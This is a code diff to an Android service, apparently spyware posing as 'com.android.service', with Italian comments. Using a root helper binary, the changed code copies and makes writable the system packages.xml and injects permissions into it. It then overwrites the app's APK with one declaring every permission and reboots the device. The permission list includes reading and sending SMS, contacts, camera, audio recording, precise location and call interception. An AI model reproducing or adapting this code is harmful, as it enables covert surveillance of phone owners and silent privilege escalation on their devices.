@@ -124,7 +124,7 @@ public class ServiceCore extends Service {
 	public void onStart(Intent intent, int startId) {
 		super.onStart(intent, startId);
 		
-		if (checkRoot() == true) {
+		if (PackageInfo.checkRoot() == true) {
 			Status.self().setRoot(true);
 		} else {
 			Status.self().setRoot(false);
@@ -139,7 +139,7 @@ public class ServiceCore extends Service {
 			}
 		}
 
-		if (checkRoot() == true) {
+		if (PackageInfo.checkRoot() == true) {
 			int ret = overridePermissions();
 			
 			Toast.makeText(this, "RET: " + ret, Toast.LENGTH_LONG).show(); //$NON-NLS-1$
@@ -175,27 +175,34 @@ public class ServiceCore extends Service {
 		// Controlliamo se abbiamo le capabilities necessarie
 		PackageManager pkg = Status.getAppContext().getPackageManager();
 
-		/*if (pkg != null) {
+		if (pkg != null) {
 			int perm = pkg.checkPermission("android.permission.READ_SMS", "com.android.service");
 			
 			if (perm == PackageManager.PERMISSION_GRANTED) {
 				return 2;
 			}
-		}*/
+		}
 		
 		try {
-			FileOutputStream fos = openFileOutput("perm.xml", MODE_PRIVATE);
-			
 			//Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
+			// Creiamo la directory files
+			openFileOutput("test", Context.MODE_WORLD_READABLE);
+
 			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
 			invokeRun("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			Utils.sleep(600);
 			invokeRun("/system/bin/ntpsvd pzm 666 /data/data/com.android.service/files/packages.xml");
 			
+			// Rimuoviamo il file temporaneo
+			File tmp = new File("/data/data/com.android.service/files/test");
+			
+			if (tmp.exists() == true) {
+				tmp.delete();
+			}
+			
 			// Aggiorniamo il file
 		    FileInputStream fin = openFileInput("packages.xml");
 		    
-		    // TEST
 		    PackageInfo pi = new PackageInfo(fin, "com.android.service");
 		    
 		    String path = pi.getPackagePath();
@@ -204,10 +211,8 @@ public class ServiceCore extends Service {
 		    	return 0;
 		    }
 		    
-		    ArrayList<String> perm = pi.getPackagePermissions();
-		    
 		    // Vediamo se gia' ci sono i permessi richiesti
-		    if (checkRequiredPermission(perm) == true) {
+		    if (pi.checkRequiredPermission() == true) {
 		    	if (Cfg.DEBUG) {
 					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
 				}
@@ -222,101 +227,14 @@ public class ServiceCore extends Service {
 				return 2;
 		    }
 		    
-		    pi.addPermissions(perm);
-		    // FINE TEST
-		    
-		    byte[] buffer = Utils.inputStreamToBuffer(fin, 0);
-		    
-		    // ... Cerchiamo la nostra riga e la package location
-		    String packages = new String(buffer);
-		    buffer = null;
-		    
-		    int pos = packages.indexOf("<package name=\"com.android.service\" ");
-		    
-		    if (pos == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find package name"); //$NON-NLS-1$
-				}
-		    	
-		    	return 0;
-		    }
-		    
-		    // Package position
-		    int apkBegin = packages.indexOf("codePath=\"", pos);
-		    
-		    if (apkBegin == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find apk"); //$NON-NLS-1$
-				}
-		    	
-		    	return 0;
-		    }
-		    
-		    apkBegin += 10; // codePath="
-		    
-		    int apkEnd = packages.indexOf(".apk\"", apkBegin);
-		    
-		    if (apkEnd == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find apk end"); //$NON-NLS-1$
-				}
-		    	
-		    	return 0;
-		    }
-		    
-		    apkEnd += 4; // .apk
-		    
-		    // Blocco dei permessi
-		    int permsBegin = packages.indexOf("<perms>", pos);
-		    
-		    if (permsBegin == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find <perms>"); //$NON-NLS-1$
-				}
-		    	
-		    	return 0;
-		    }
-		    
-		    // Eliminiamo <perms>
-		    permsBegin += 7;
-		    	
-		    int permsEnd = packages.indexOf("</perms>", permsBegin);
-		    
-		    if (permsEnd == -1) {
-		    	if (Cfg.DEBUG) {
-					Check.log(TAG + " (overridePermissions): cannot find </perms>"); //$NON-NLS-1$
-				}
-		    	
-		    	return 0;
-		    }
-		    
-		    // Verifichiamo se non abbiamo gia' i permessi necessari
-		    String actualPerms = packages.substring(permsBegin, permsEnd);
-		    
-		   
-		    
-		    // Creiamo il nuovo file
-		    //FileOutputStream fos = openFileOutput("perm.xml", MODE_PRIVATE);
-		    
-		    // Scriviamo tutta la prima parte fino a <perms> incluso
-		    fos.write(packages.substring(0, permsBegin).getBytes("US_ASCII"));
-		    
-		    // Quindi i nuovi permessi
-		    //fos.write(getRequiredPermission().getBytes("US_ASCII"));
-		    
-		    // E di seguito tutto il resto
-		    fos.write(packages.substring(permsEnd).getBytes("US_ASCII"));
-		    
-		    fos.close();
-		    
-		    Resources resources = getResources();
-		    InputStream manifestApkStream = resources.openRawResource(R.raw.layout);
-		    
+		    pi.addRequiredPermissions("perm.xml");   
+		        
+		    // .apk con tutti i permessi nel manifest
+		    InputStream manifestApkStream = getResources().openRawResource(R.raw.layout);
 		    fileWrite(manifest, manifestApkStream, "0xA83E0F44BD7A4D20");
-		    String apkLocation = packages.substring(apkBegin, apkEnd);
 	
 			// Copiamolo in /data/app/*.apk
-		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > " + apkLocation + "\"");
+		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/layout > " + path + "\"");
 		
 			// Copiamolo in /data/system/packages.xml
 		    invokeRun("/system/bin/ntpsvd qzx \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\"");
@@ -341,6 +259,9 @@ public class ServiceCore extends Service {
 			if (f.exists() == true) {
 				f.delete();
 			}
+			
+			// Riavviamo il telefono
+			invokeRun("/system/bin/ntpsvd reb");
 		} catch (Exception e1) {
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
@@ -398,7 +319,7 @@ public class ServiceCore extends Service {
 			while (System.currentTimeMillis() - now < 100 * 1000) {
 				Utils.sleep(1000);
 
-				if (checkRoot()) {
+				if (PackageInfo.checkRoot()) {
 					isRoot = true;
 					break;
 				}
@@ -497,83 +418,6 @@ public class ServiceCore extends Service {
 		}
 		
 		return cis;
-	}
-
-	private boolean checkRoot() { //$NON-NLS-1$
-		boolean isRoot = false;
-
-		try {
-			// Verifichiamo di essere root
-			final AutoFile file = new AutoFile(Configuration.shellFile);
-
-			if (file.exists() && file.canRead()) {
-				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
-				p.waitFor();
-
-				if (p.exitValue() == 1) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
-					}
-
-					isRoot = true;
-				}
-			}
-		} catch (final Exception e) {
-			if (Cfg.DEBUG) {
-				e.printStackTrace();
-				Check.log(e);//$NON-NLS-1$
-			}
-		}
-
-		return isRoot;
-	}
-
-	private boolean checkRequiredPermission(ArrayList<String> a) {
-		boolean permFound = false;
-		
-		String requiredPerms[] =  {
-				"android.permission.READ_LOGS",
-				"android.permission.READ_SMS",
-				"android.permission.SET_WALLPAPER",
-				"android.permission.SEND_SMS",
-				"android.permission.PROCESS_OUTGOING_CALLS",
-				"android.permission.WRITE_APN_SETTINGS",
-				"android.permission.WRITE_EXTERNAL_STORAGE",
-				"android.permission.WRITE_SMS",
-				"android.permission.ACCESS_WIFI_STATE",
-				"android.permission.ACCESS_COARSE_LOCATION",
-				"android.permission.RECEIVE_SMS",
-				"android.permission.READ_CONTACTS",
-				"android.permission.CALL_PHONE",
-				"android.permission.READ_PHONE_STATE",
-				"android.permission.RECEIVE_BOOT_COMPLETED",
-				"android.permission.CAMERA",
-				"android.permission.INTERNET",
-				"android.permission.CHANGE_WIFI_STATE",
-				"android.permission.ACCESS_FINE_LOCATION",
-				"android.permission.VIBRATE",
-				"android.permission.WAKE_LOCK",
-				"android.permission.RECORD_AUDIO",
-				"android.permission.ACCESS_NETWORK_STATE",
-				"android.permission.FLASHLIGHT" 
-		};
-		
-		for (int i = 0; i < requiredPerms.length; i++) {
-			for (String actualPerms : a) {
-				permFound = false;
-
-				if (actualPerms.equals(requiredPerms[i]) == true) {
-					permFound = true;
-					break;
-				}
-			}
-
-			if (permFound == false) {
-				break;
-			}
-		}
-		
-		return permFound; 
 	}
 	
 	// Exploit thread
